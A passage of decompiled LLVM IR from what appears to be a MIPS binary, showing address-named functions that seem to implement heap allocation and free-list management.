  store i32 %v3_406340, i32* %a0.global-to-local, align 4
  %v2_406344 = call i32 @function_406e64(i32 %v3_406340)
  store i32 %v2_406344, i32* @v0, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v0_406350 = load i32, i32* @s0, align 4
  %v3_406354 = load i32, i32* @global_var_449cd0.229, align 4
  store i32 %v3_406354, i32* @t9, align 4
  %v3_406358 = load i32, i32* bitcast (i32*** @global_var_449c90.223 to i32*), align 4
  store i32 %v3_406358, i32* %a0.global-to-local, align 4
  %v1_40635c = load i32, i32* @s1, align 4
  %tmp12 = inttoptr i32 %v3_406358 to i32*
  %v7_40635c = call i32 @function_406748(i32* %tmp12, i32 %v1_40635c, i32 %v0_406350)
  store i32 %v7_40635c, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v3_406370 = load i32, i32* bitcast (i32*** @global_var_449c90.223 to i32*), align 4
  store i32 %v3_406370, i32* %a0.global-to-local, align 4
  %tmp13 = inttoptr i32 %v3_406370 to i32*
  %v8_406374 = call i32 @function_406640(i32* %tmp13, i32 %v3_40625c)
  store i32 %v8_406374, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v3_406388 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
  store i32 %v3_406388, i32* %a0.global-to-local, align 4
  store i32 %v8_406374, i32* %s0.global-to-local, align 4
  %v3_40638c = call i32 @function_406e64(i32 %v3_406388)
  store i32 %v3_40638c, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v1_406398 = icmp eq i32 %v8_406374, 0
  br i1 %v1_406398, label %dec_label_pc_4063b8, label %dec_label_pc_4063a0

dec_label_pc_4063a0:                              ; preds = %dec_label_pc_406338, %dec_label_pc_406234
  %v1_4063a8 = phi i32 [ %v8_406374, %dec_label_pc_406338 ], [ %v8_40625c, %dec_label_pc_406234 ]
  %v3_4063a0 = load i32, i32* %stack_var_-24, align 4
  %v2_4063a8 = inttoptr i32 %v1_4063a8 to i32*
  store i32 %v3_4063a0, i32* %v2_4063a8, align 4
  %v0_4063ac = load i32, i32* %s0.global-to-local, align 4
  %v1_4063ac = add i32 %v0_4063ac, 4
  store i32 %v1_4063ac, i32* %s0.global-to-local, align 4
  %v1_4063b0 = icmp eq i32 %v1_4063ac, 0
  store i32 %v1_4063ac, i32* %v0.global-to-local, align 4
  br i1 %v1_4063b0, label %dec_label_pc_4063a0.dec_label_pc_4063b8_crit_edge, label %dec_label_pc_4063d8

dec_label_pc_4063a0.dec_label_pc_4063b8_crit_edge: ; preds = %dec_label_pc_4063a0
  %v0_4063b8.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4063b8

dec_label_pc_4063b8:                              ; preds = %dec_label_pc_4063a0.dec_label_pc_4063b8_crit_edge, %dec_label_pc_406230, %dec_label_pc_406338, %dec_label_pc_40631c
  %v0_4063b8 = phi i32 [ %v0_4063b8.pre, %dec_label_pc_4063a0.dec_label_pc_4063b8_crit_edge ], [ %v2_406208, %dec_label_pc_406230 ], [ %v2_406208, %dec_label_pc_406338 ], [ %v2_406208, %dec_label_pc_40631c ]
  %v1_4063b8 = add i32 %v0_4063b8, -32500
  %v2_4063b8 = inttoptr i32 %v1_4063b8 to i32*
  %v3_4063b8 = load i32, i32* %v2_4063b8, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4063b8)
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v1_4063d0 = load i32, i32* %v0.global-to-local, align 4
  %v2_4063d0 = inttoptr i32 %v1_4063d0 to i32*
  store i32 12, i32* %v2_4063d0, align 4
  %v0_4063d4 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_4063d4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4063d8

dec_label_pc_4063d8:                              ; preds = %dec_label_pc_4063a0, %dec_label_pc_4063b8
  %v4_4063e4 = phi i32 [ %v1_4063ac, %dec_label_pc_4063a0 ], [ %v0_4063d4, %dec_label_pc_4063b8 ]
  store i32 %v0_406214, i32* @s1, align 4
  store i32 %v0_406218, i32* @s0, align 4
  ret i32 %v4_4063e4

; uselistorder directives
  uselistorder i32 %v8_406374, { 1, 0, 2, 3 }
  uselistorder i32 %v2_4062f8, { 1, 0, 2 }
  uselistorder i32 %v3_4062d0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_406290, { 1, 0, 2, 3 }
  uselistorder i32 %v8_40625c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_406208, { 3, 0, 1, 2, 13, 12, 11, 10, 9, 14, 8, 7, 6, 5, 4, 15 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2 }
  uselistorder i32* %v0.global-to-local, { 3, 8, 4, 5, 6, 7, 9, 12, 10, 11, 16, 13, 14, 15, 17, 18, 2, 0, 1 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %gp.global-to-local, { 2, 11, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 0, 1 }
  uselistorder i32* %a0.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_4063d8, { 1, 0 }
  uselistorder label %dec_label_pc_4063b8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_40631c, { 1, 0 }
  uselistorder label %dec_label_pc_4062f4, { 1, 0 }
  uselistorder label %dec_label_pc_4062b0, { 1, 0 }
  uselistorder label %dec_label_pc_406230, { 1, 0 }
}

define i32 @function_4063f0(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4063f0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg1 to i32
  %v3_406410 = sext i32 %arg2 to i64
  %v5_406410 = mul nsw i64 %v3_406410, %arg1
  %v6_406410 = trunc i64 %v5_406410 to i32
  %v3_406414 = load i32, i32* @global_var_449cb8.14, align 4
  store i32 %v6_406410, i32* %s0.global-to-local, align 4
  %v2_40641c = icmp eq i32 %tmp, 0
  store i32 %v3_406414, i32* %v1.global-to-local, align 4
  br i1 %v2_40641c, label %dec_label_pc_406458, label %dec_label_pc_406420

dec_label_pc_406420:                              ; preds = %dec_label_pc_4063f0
  %v6_406424 = udiv i32 %v6_406410, %tmp
  %v3_406430 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_406430, i32* @t9, align 4
  store i32 %v6_406424, i32* @v0, align 4
  %v2_406438 = icmp eq i32 %v6_406424, %arg2
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_406438, label %dec_label_pc_406458, label %dec_label_pc_40643c

dec_label_pc_40643c:                              ; preds = %dec_label_pc_406420
  %v1_406440 = call i32 @function_4057a0()
  store i32 %v1_406440, i32* @v0, align 4
  store i32 12, i32* %v1.global-to-local, align 4
  %v2_406454 = inttoptr i32 %v1_406440 to i32*
  store i32 12, i32* %v2_406454, align 4
  %v0_406458.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406458

dec_label_pc_406458:                              ; preds = %dec_label_pc_406420, %dec_label_pc_4063f0, %dec_label_pc_40643c
  %v0_406458 = phi i32 [ %v3_406414, %dec_label_pc_406420 ], [ %v3_406414, %dec_label_pc_4063f0 ], [ %v0_406458.pre, %dec_label_pc_40643c ]
  call void @__pseudo_call(i32 %v0_406458)
  %v0_406468 = load i32, i32* @v0, align 4
  store i32 %v0_406468, i32* %s1.global-to-local, align 4
  %v1_406478 = icmp eq i32 %v0_406468, 0
  br i1 %v1_406478, label %dec_label_pc_40648c, label %dec_label_pc_40647c

dec_label_pc_40647c:                              ; preds = %dec_label_pc_406458
  %v0_406470 = load i32, i32* %s0.global-to-local, align 4
  %v4_406480 = inttoptr i32 %v0_406468 to i32*
  %v5_406480 = call i32 @function_405830(i32* %v4_406480, i32 0, i32 %v0_406470)
  %v0_40648c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40648c

dec_label_pc_40648c:                              ; preds = %dec_label_pc_406458, %dec_label_pc_40647c
  %v0_40648c = phi i32 [ 0, %dec_label_pc_406458 ], [ %v0_40648c.pre, %dec_label_pc_40647c ]
  ret i32 %v0_40648c

; uselistorder directives
  uselistorder i32 %v0_406468, { 1, 0, 2 }
  uselistorder label %dec_label_pc_40648c, { 1, 0 }
  uselistorder label %dec_label_pc_406458, { 2, 0, 1 }
}

define i32 @function_4064b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064b0:
  %gp.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_4064b8 = load i32, i32* @t9, align 4
  %v2_4064b8 = add i32 %v1_4064b8, 308656
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v0_4064c0 = load i32, i32* @ra, align 4
  %v0_4064c4 = load i32, i32* @s2, align 4
  %v0_4064c8 = load i32, i32* @s1, align 4
  %v0_4064cc = load i32, i32* @s0, align 4
  %v1_4064d4 = icmp eq i32 %arg1, 0
  br i1 %v1_4064d4, label %dec_label_pc_406624, label %dec_label_pc_4064d8

dec_label_pc_4064d8:                              ; preds = %dec_label_pc_4064b0
  %v3_4064e0 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
  %v1_4064e4 = add i32 %arg1, -4
  %v2_4064e4 = inttoptr i32 %v1_4064e4 to i32*
  %v3_4064e4 = load i32, i32* %v2_4064e4, align 4
  store i32 %v3_4064e4, i32* @s1, align 4
  store i32 %v1_4064e4, i32* @s0, align 4
  %v4_4064e8 = call i32 @function_406e64(i32 %v3_4064e0)
  store i32 %v4_4064e8, i32* @v0, align 4
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v3_4064f8 = load i32, i32* @global_var_449cd0.229, align 4
  store i32 %v3_4064f8, i32* @t9, align 4
  %v3_4064fc = load i32, i32* bitcast (i32*** @global_var_449c90.223 to i32*), align 4
  %v0_406500 = load i32, i32* @s0, align 4
  %v1_406504 = load i32, i32* @s1, align 4
  %tmp9 = inttoptr i32 %v3_4064fc to i32*
  %v7_406504 = call i32 @function_406748(i32* %tmp9, i32 %v0_406500, i32 %v1_406504)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v1_406510 = inttoptr i32 %v7_406504 to i32*
  %v2_406510 = load i32, i32* %v1_406510, align 4
  store i32 %v2_406510, i32* %s2.global-to-local, align 4
  store i32 %v7_406504, i32* @s0, align 4
  %v3_406518 = load i32, i32* @global_var_449b80, align 4
  %v1_406528 = mul i32 %v3_406518, 8
  %v2_40652c = icmp ult i32 %v2_406510, %v1_406528
  br i1 %v2_40652c, label %dec_label_pc_406584, label %dec_label_pc_406534

dec_label_pc_406534:                              ; preds = %dec_label_pc_4064d8
  %v3_40653c = load i32, i32* bitcast (i32** @global_var_449ba4.227 to i32*), align 4
  %v2_406540 = add i32 %v7_406504, 12
  store i32 %v2_406540, i32* @s1, align 4
  %v4_406540 = call i32 @function_406e64(i32 %v3_40653c)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v3_406550 = load i32, i32* @global_var_449ce8.228, align 4
  store i32 %v3_406550, i32* @t9, align 4
  %v2_406558 = call i32 @function_407ad0(i32 0)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v0_406564 = load i32, i32* @s1, align 4
  %v2_406564 = icmp eq i32 %v0_406564, %v2_406558
  br i1 %v2_406564, label %dec_label_pc_4065a4, label %dec_label_pc_406568

dec_label_pc_406568:                              ; preds = %dec_label_pc_406534
  %v3_406570 = load i32, i32* bitcast (i32** @global_var_449ba4.227 to i32*), align 4
  %v2_406574 = call i32 @function_406e64(i32 %v3_406570)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406584

dec_label_pc_406584:                              ; preds = %dec_label_pc_4064d8, %dec_label_pc_406568
  %v3_406588 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
  store i32 %v0_4064c4, i32* %s2.global-to-local, align 4
  store i32 %v0_4064c8, i32* @s1, align 4
  store i32 %v0_4064cc, i32* @s0, align 4
  %v5_40659c = call i32 @function_406e64(i32 %v3_406588)
  br label %dec_label_pc_4065a4

dec_label_pc_4065a4:                              ; preds = %dec_label_pc_406534, %dec_label_pc_406584
  %v0_4065a4 = load i32, i32* @s0, align 4
  %v1_4065a4 = add i32 %v0_4065a4, 4
  %v2_4065a4 = inttoptr i32 %v1_4065a4 to i32*
  %v3_4065a4 = load i32, i32* %v2_4065a4, align 4
  store i32 %v3_4065a4, i32* %v1.global-to-local, align 4
  %v1_4065ac = icmp eq i32 %v3_4065a4, 0
  br i1 %v1_4065ac, label %dec_label_pc_4065c0, label %dec_label_pc_4065b0

dec_label_pc_4065b0:                              ; preds = %dec_label_pc_4065a4
  %v1_4065b4 = add i32 %v0_4065a4, 8
  %v2_4065b4 = inttoptr i32 %v1_4065b4 to i32*
  %v3_4065b4 = load i32, i32* %v2_4065b4, align 4
  %v2_4065bc = add i32 %v3_4065a4, 8
  %v3_4065bc = inttoptr i32 %v2_4065bc to i32*
  store i32 %v3_4065b4, i32* %v3_4065bc, align 4
  %v0_4065c0.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_4065c0

dec_label_pc_4065c0:                              ; preds = %dec_label_pc_4065a4, %dec_label_pc_4065b0
  %v0_4065c0 = phi i32 [ %v0_4065a4, %dec_label_pc_4065a4 ], [ %v0_4065c0.pre, %dec_label_pc_4065b0 ]
  %v1_4065c0 = add i32 %v0_4065c0, 8
  %v2_4065c0 = inttoptr i32 %v1_4065c0 to i32*
  %v3_4065c0 = load i32, i32* %v2_4065c0, align 4
  %v1_4065c4 = add i32 %v0_4065c0, 4
  %v2_4065c4 = inttoptr i32 %v1_4065c4 to i32*
  %v3_4065c4 = load i32, i32* %v2_4065c4, align 4
  store i32 %v3_4065c4, i32* %v1.global-to-local, align 4
  %v1_4065c8 = icmp eq i32 %v3_4065c0, 0
  br i1 %v1_4065c8, label %dec_label_pc_4065d8, label %dec_label_pc_4065cc

dec_label_pc_4065cc:                              ; preds = %dec_label_pc_4065c0
  %v2_4065d4 = add i32 %v3_4065c0, 4
  %v3_4065d4 = inttoptr i32 %v2_4065d4 to i32*
  store i32 %v3_4065c4, i32* %v3_4065d4, align 4
  %v0_4065e0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4065d8

dec_label_pc_4065d8:                              ; preds = %dec_label_pc_4065c0, %dec_label_pc_4065cc
  %v0_4065e0 = phi i32 [ %v3_4065c4, %dec_label_pc_4065c0 ], [ %v0_4065e0.pre, %dec_label_pc_4065cc ]
  %v0_4065d8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4065d8 = add i32 %v0_4065d8, -32208
  %v2_4065d8 = inttoptr i32 %v1_4065d8 to i32*
  %v3_4065d8 = load i32, i32* %v2_4065d8, align 4
  %v2_4065e0 = inttoptr i32 %v3_4065d8 to i32*
  store i32 %v0_4065e0, i32* %v2_4065e0, align 4
  %v0_4065e4 = load i32, i32* %gp.global-to-local, align 4
  %v1_4065e4 = add i32 %v0_4065e4, -32264
  %v2_4065e4 = inttoptr i32 %v1_4065e4 to i32*
  %v3_4065e4 = load i32, i32* %v2_4065e4, align 4
  call void @__pseudo_call(i32 %v3_4065e4)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  %v0_4065f8 = load i32, i32* @s0, align 4
  %v1_4065f8 = load i32, i32* %s2.global-to-local, align 4
  %v3_4065fc = load i32, i32* @global_var_449ce8.228, align 4
  store i32 %v3_4065fc, i32* @t9, align 4
  %v2_406604 = load i32, i32* @s1, align 4
  %v2_4065f8 = add i32 %v0_4065f8, 12
  %v1_406600 = sub i32 %v2_4065f8, %v1_4065f8
  %v3_406604 = sub i32 %v1_406600, %v2_406604
  %v5_406604 = call i32 @function_407ad0(i32 %v3_406604)
  store i32 %v2_4064b8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406624

dec_label_pc_406624:                              ; preds = %dec_label_pc_4064b0, %dec_label_pc_4065d8
  %.0 = phi i32 [ undef, %dec_label_pc_4064b0 ], [ %v5_406604, %dec_label_pc_4065d8 ]
  store i32 %v0_4064c0, i32* @ra, align 4
  store i32 %v0_4064c4, i32* @s2, align 4
  store i32 %v0_4064c8, i32* @s1, align 4
  store i32 %v0_4064cc, i32* @s0, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_4065c0, { 1, 0 }
  uselistorder i32 %v0_4064cc, { 1, 0 }
  uselistorder i32 %v0_4064c8, { 1, 0 }
  uselistorder i32 %v0_4064c4, { 1, 0 }
  uselistorder i32 %v2_4064b8, { 3, 2, 6, 5, 4, 1, 0, 7 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 5, 6, 2, 3, 4, 7, 8, 9 }
  uselistorder i32 (i32)* @function_407ad0, { 3, 2, 1, 0 }
  uselistorder i32 256, { 0, 1, 32, 30, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 33, 17, 19, 18, 21, 20, 22, 23, 24, 26, 25, 27, 28, 29, 31 }
  uselistorder label %dec_label_pc_406624, { 1, 0 }
  uselistorder label %dec_label_pc_4065d8, { 1, 0 }
  uselistorder label %dec_label_pc_4065c0, { 1, 0 }
  uselistorder label %dec_label_pc_4065a4, { 1, 0 }
  uselistorder label %dec_label_pc_406584, { 1, 0 }
}

define i32 @function_406640(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406640:
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_406640 = inttoptr i32 %arg2 to i32*
  %v2_406640 = load i32, i32* %v1_406640, align 4
  store i32 -4, i32* %v1.global-to-local, align 4
  %v1_406648 = add i32 %v2_406640, 3
  %v2_40664c = and i32 %v1_406648, -4
  store i32 %v2_40664c, i32* %a2.global-to-local, align 4
  %v1_406650 = icmp ult i32 %v2_40664c, 12
  %v2_406650 = zext i1 %v1_406650 to i32
  store i32 %v2_406650, i32* %v0.global-to-local, align 4
  %v1_406654 = icmp eq i1 %v1_406650, false
  br i1 %v1_406654, label %dec_label_pc_406660, label %dec_label_pc_406658

dec_label_pc_406658:                              ; preds = %dec_label_pc_406640
  store i32 12, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_406660

dec_label_pc_406660:                              ; preds = %dec_label_pc_406640, %dec_label_pc_406658
  %v3_406684 = phi i32 [ %v2_40664c, %dec_label_pc_406640 ], [ 12, %dec_label_pc_406658 ]
  %v2_406660 = load i32, i32* %arg1, align 4
  store i32 %v2_406660, i32* %v1.global-to-local, align 4
  %v3_406678 = add i32 %v3_406684, 44
  br label %dec_label_pc_40666c

dec_label_pc_40666c:                              ; preds = %dec_label_pc_4066e4, %dec_label_pc_406660
  %v0_4066e4 = phi i32 [ %v3_4066e4, %dec_label_pc_4066e4 ], [ %v2_406660, %dec_label_pc_406660 ]
  %v1_40666c = inttoptr i32 %v0_4066e4 to i32*
  %v2_40666c = load i32, i32* %v1_40666c, align 4
  store i32 %v2_40666c, i32* @a3, align 4
  %v2_406674 = icmp ult i32 %v2_40666c, %v3_406684
  store i32 %v3_406678, i32* %v0.global-to-local, align 4
  br i1 %v2_406674, label %dec_label_pc_4066e4, label %dec_label_pc_40667c

dec_label_pc_40667c:                              ; preds = %dec_label_pc_40666c
  %v2_406680 = icmp ult i32 %v2_40666c, %v3_406678
  %v1_406684 = icmp eq i1 %v2_406680, false
  %v4_406684 = sub i32 %v2_40666c, %v3_406684
  store i32 %v4_406684, i32* %v0.global-to-local, align 4
  br i1 %v1_406684, label %dec_label_pc_4066d0, label %dec_label_pc_406688

dec_label_pc_406688:                              ; preds = %dec_label_pc_40667c
  %v1_40668c = add i32 %v0_4066e4, 4
  %v2_40668c = inttoptr i32 %v1_40668c to i32*
  %v3_40668c = load i32, i32* %v2_40668c, align 4
  store i32 %v3_40668c, i32* %a2.global-to-local, align 4
  %v1_406694 = icmp eq i32 %v3_40668c, 0
  br i1 %v1_406694, label %dec_label_pc_4066a8, label %dec_label_pc_406698

dec_label_pc_406698:                              ; preds = %dec_label_pc_406688
  %v1_40669c = add i32 %v0_4066e4, 8
  %v2_40669c = inttoptr i32 %v1_40669c to i32*
  %v3_40669c = load i32, i32* %v2_40669c, align 4
  store i32 %v3_40669c, i32* %v0.global-to-local, align 4
  %v2_4066a4 = add i32 %v3_40668c, 8
  %v3_4066a4 = inttoptr i32 %v2_4066a4 to i32*
  store i32 %v3_40669c, i32* %v3_4066a4, align 4
  %v0_4066a8.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4066a8

dec_label_pc_4066a8:                              ; preds = %dec_label_pc_406688, %dec_label_pc_406698
  %v0_4066a8 = phi i32 [ %v0_4066e4, %dec_label_pc_406688 ], [ %v0_4066a8.pre, %dec_label_pc_406698 ]
  %v1_4066a8 = add i32 %v0_4066a8, 8
  %v2_4066a8 = inttoptr i32 %v1_4066a8 to i32*
  %v3_4066a8 = load i32, i32* %v2_4066a8, align 4
  store i32 %v3_4066a8, i32* %v0.global-to-local, align 4
  %v1_4066ac = add i32 %v0_4066a8, 4
  %v2_4066ac = inttoptr i32 %v1_4066ac to i32*
  %v3_4066ac = load i32, i32* %v2_4066ac, align 4
  store i32 %v3_4066ac, i32* %t0.global-to-local, align 4
  %v1_4066b0 = icmp eq i32 %v3_4066a8, 0
  br i1 %v1_4066b0, label %dec_label_pc_4066c4, label %dec_label_pc_4066b4

dec_label_pc_4066b4:                              ; preds = %dec_label_pc_4066a8
  %v0_4066b8 = load i32, i32* @a3, align 4
  store i32 %v0_4066b8, i32* %a2.global-to-local, align 4
  %v2_4066c0 = add i32 %v3_4066a8, 4
  %v3_4066c0 = inttoptr i32 %v2_4066c0 to i32*
  store i32 %v3_4066ac, i32* %v3_4066c0, align 4
  %v0_4066cc.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_4066c4

dec_label_pc_4066c4:                              ; preds = %dec_label_pc_4066a8, %dec_label_pc_4066b4
  %v0_4066cc = phi i32 [ %v3_4066ac, %dec_label_pc_4066a8 ], [ %v0_4066cc.pre, %dec_label_pc_4066b4 ]
  %v0_4066c4 = load i32, i32* @a3, align 4
  store i32 %v0_4066c4, i32* %a2.global-to-local, align 4
  store i32 %v0_4066cc, i32* %arg1, align 4
  %v0_4066d0.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_4066d0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4066d0

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40667c, %dec_label_pc_4066c4
  %v1_4066d0 = phi i32 [ %v0_4066e4, %dec_label_pc_40667c ], [ %v1_4066d0.pre, %dec_label_pc_4066c4 ]
  %v0_4066d0 = phi i32 [ %v4_406684, %dec_label_pc_40667c ], [ %v0_4066d0.pre, %dec_label_pc_4066c4 ]
  %v2_4066d0 = inttoptr i32 %v1_4066d0 to i32*
  store i32 %v0_4066d0, i32* %v2_4066d0, align 4
  %v0_4066d4 = load i32, i32* %v1.global-to-local, align 4
  %v1_4066d4 = load i32, i32* @a3, align 4
  %v2_4066d4 = sub i32 %v0_4066d4, %v1_4066d4
  %v1_4066d8 = add i32 %v2_4066d4, 12
  store i32 %v1_4066d8, i32* %v0.global-to-local, align 4
  %v1_4066dc = load i32, i32* %a2.global-to-local, align 4
  store i32 %v1_4066dc, i32* %v1_406640, align 4
  ret i32 %v1_4066d8

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_40666c
  %v1_4066e4 = add i32 %v0_4066e4, 4
  %v2_4066e4 = inttoptr i32 %v1_4066e4 to i32*
  %v3_4066e4 = load i32, i32* %v2_4066e4, align 4
  store i32 %v3_4066e4, i32* %v1.global-to-local, align 4
  %v1_4066ec = icmp eq i32 %v3_4066e4, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_4066ec, label %dec_label_pc_4066f0, label %dec_label_pc_40666c

dec_label_pc_4066f0:                              ; preds = %dec_label_pc_4066e4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_4066e4, { 1, 2, 0 }
  uselistorder i32 %v0_4066a8, { 1, 0 }
  uselistorder i32 %v2_40666c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_4066e4, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v3_406684, { 2, 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %a2.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_4066d0, { 1, 0 }
  uselistorder label %dec_label_pc_4066c4, { 1, 0 }
  uselistorder label %dec_label_pc_4066a8, { 1, 0 }
  uselistorder label %dec_label_pc_406660, { 1, 0 }
}

define i32 @function_406700(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_406700:
  %v2_406700 = add i32 %arg2, 4
  %v3_406700 = inttoptr i32 %v2_406700 to i32*
  store i32 %arg4, i32* %v3_406700, align 4
  %v1_406704 = icmp eq i32 %arg3, 0
  %v4_406704 = add i32 %arg2, 8
  %v5_406704 = inttoptr i32 %v4_406704 to i32*
  store i32 %arg3, i32* %v5_406704, align 4
  br i1 %v1_406704, label %dec_label_pc_406714, label %dec_label_pc_406708

dec_label_pc_406708:                              ; preds = %dec_label_pc_406700
  %v2_406710 = add i32 %arg3, 4
  %v3_406710 = inttoptr i32 %v2_406710 to i32*
  store i32 %arg2, i32* %v3_406710, align 4
  br label %dec_label_pc_406714

dec_label_pc_406714:                              ; preds = %dec_label_pc_406700, %dec_label_pc_406708
  store i32 %arg2, i32* %arg1, align 4
  %v1_406718 = icmp eq i32 %arg4, 0
  br i1 %v1_406718, label %dec_label_pc_406724, label %dec_label_pc_40671c

dec_label_pc_40671c:                              ; preds = %dec_label_pc_406714
  %v2_406720 = add i32 %arg4, 8
  %v3_406720 = inttoptr i32 %v2_406720 to i32*
  store i32 %arg2, i32* %v3_406720, align 4
  br label %dec_label_pc_406724

dec_label_pc_406724:                              ; preds = %dec_label_pc_406714, %dec_label_pc_40671c
  %v1_406724 = load i32, i32* @v0, align 4
  ret i32 %v1_406724

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_406724, { 1, 0 }
  uselistorder label %dec_label_pc_406714, { 1, 0 }
}

define i32 @function_40672c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40672c:
  %v1_40672c = icmp eq i32 %arg3, 0
  br i1 %v1_40672c, label %dec_label_pc_40673c, label %dec_label_pc_406730

dec_label_pc_406730:                              ; preds = %dec_label_pc_40672c
  %v2_406738 = add i32 %arg3, 4
  %v3_406738 = inttoptr i32 %v2_406738 to i32*
  store i32 %arg2, i32* %v3_406738, align 4
  br label %dec_label_pc_40673c

dec_label_pc_40673c:                              ; preds = %dec_label_pc_40672c, %dec_label_pc_406730
  store i32 %arg2, i32* %arg1, align 4
  %v3_406740 = add i32 %arg2, 8
  %v4_406740 = inttoptr i32 %v3_406740 to i32*
  store i32 %arg3, i32* %v4_406740, align 4
  %v5_406740 = load i32, i32* @v0, align 4
  ret i32 %v5_406740

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_40673c, { 1, 0 }
}

define i32 @function_406748(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406748:
  %a2.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %v2_40676c = load i32, i32* %arg1, align 4
  store i32 %v2_40676c, i32* %s0.global-to-local, align 4
  %v1_406770 = load i32, i32* %a2.global-to-local, align 4
  %v2_406770 = add i32 %v1_406770, %arg2
  store i32 %v2_406770, i32* %t0.global-to-local, align 4
  store i32 0, i32* %t1.global-to-local, align 4
  %.old = load i32, i32* @v0, align 4
  %v1_40677c.old = icmp eq i32 %.old, 0
  br i1 %v1_40677c.old, label %dec_label_pc_4067a4, label %dec_label_pc_406780

dec_label_pc_406780:                              ; preds = %dec_label_pc_406748, %dec_label_pc_406780
  %v0_406784 = phi i32 [ %v3_406788, %dec_label_pc_406780 ], [ %v2_40676c, %dec_label_pc_406748 ]
  store i32 %v0_406784, i32* %t1.global-to-local, align 4
  %v1_406788 = add i32 %v0_406784, 4
  %v2_406788 = inttoptr i32 %v1_406788 to i32*
  %v3_406788 = load i32, i32* %v2_406788, align 4
  store i32 %v3_406788, i32* %s0.global-to-local, align 4
  %v1_406790 = add i32 %v3_406788, 12
  %v1_406794 = icmp eq i32 %v3_406788, 0
  %v4_406794 = icmp ult i32 %v1_406790, %arg2
  %v1_40677c = icmp eq i1 %v4_406794, false
  %or.cond = or i1 %v1_406794, %v1_40677c
  br i1 %or.cond, label %dec_label_pc_4067a4, label %dec_label_pc_406780

